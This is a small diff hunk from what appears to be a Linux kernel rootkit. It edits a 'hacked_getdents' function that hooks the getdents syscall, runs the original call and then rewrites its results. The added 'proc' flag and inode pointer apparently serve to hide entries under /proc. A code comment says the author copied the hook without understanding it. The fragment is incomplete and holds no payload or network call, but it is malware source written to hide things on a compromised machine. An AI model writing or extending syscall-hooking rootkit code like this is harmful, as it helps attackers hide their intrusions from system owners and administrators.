@@ -149,7 +149,8 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 
 asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
         unsigned int tmp, n;
-        int t;
+        int t, proc = 0;
+	struct inode *dinode;
         struct dirent *dirp2, *dirp3;
 
         tmp = (*orig_getdents)(fd, dirp, count); // Basiclly it runs the original, saves it, and does stuff. Idk how this shit works, I stole it
